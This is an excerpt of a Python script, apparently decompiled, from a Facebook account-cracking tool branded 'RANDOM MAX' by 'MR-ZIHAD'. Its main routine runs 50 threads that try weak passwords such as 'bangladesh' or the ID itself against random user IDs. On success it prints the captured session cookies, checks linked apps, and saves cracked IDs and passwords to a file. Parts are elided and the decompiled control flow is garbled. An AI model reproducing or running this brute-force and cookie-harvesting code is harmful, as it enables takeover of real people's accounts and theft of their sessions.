...
def o():
    ...
    jalan('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;96m YOUTUBE')
    jalan('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32mCHOOSE : ')
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=zihad.hossain36')
        return None
    if None == '3':
        os.system('xdg-open https://github.com/MR-ZIHAD')
        return None
    if None == '4':
        os.system('xdg-open https://youtube.com/c/TECHNICALZIHAD')
        return None
    if None == '0':
        os.system('exit')
        return None
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
...
| |   |  __ /    | | | |  | |\  /| |  | || |   / ____ \   | || |    > `' <    | |
| |  _| |  \ \_  | | | | _| |_\/_| |_ | || | _/ /    \ \_ | || |  _/ /'`\ \_  | |
| | |____| |___| | | | ||_____||_____|| || ||____|  |____|| || | |____||____| | |
| |              | | | |              | || |              | || |              | |
| '--------------' | | '--------------' || '--------------' || '--------------' |
 '----------------'   '----------------'  '----------------'  '----------------'                                                                                                                                                                                                                                                                            
...
\033[1;32m=====================================================================================
\033[1;95m[\033[1;93m\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mMR-ZIHAD
\033[1;95m[\033[1;93m\033[1;95m]\033[1;93m TEAM  \033[1;91m   : \033[1;95mSTRAIKER
\033[1;95m[\033[1;93m\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mMR-ZIHAD
\033[1;95m[\033[1;93m\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mRANDOM MAX
\033[1;95m[\033[1;93m\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;32mMAX
\033[1;32m=====================================================================================\n""")
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;95m[\033[1;93m\033[1;95m]\033[1;32m TOTAL IDS: \033[1;32m'+tl)
        print('\033[1;95m[\033[1;93m\033[1;95m]\033[1;93m THE PROCESS HAS BEEN STARTED')
        print('\033[1;95m[\033[1;93m\033[1;95m]\033[1;34m WILL RUN ON ANY NETWORK')
        print('\033[1;32m=====================================================================================')
        for love in user:
            pwx = [love, 'bangladesh']
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32mRAFI-OK ] '+cid+ ' | ' +ps+    '  \n\033[1;33mCOOKIES : \033[1;32m'+coki+  ' \033[0;32mUSER-AGENT : \033[0;90m'+pro+'  \033[0;90m')
                cek_apk(session,coki)
                open('/sdcard/RAFI-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[RAFI] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
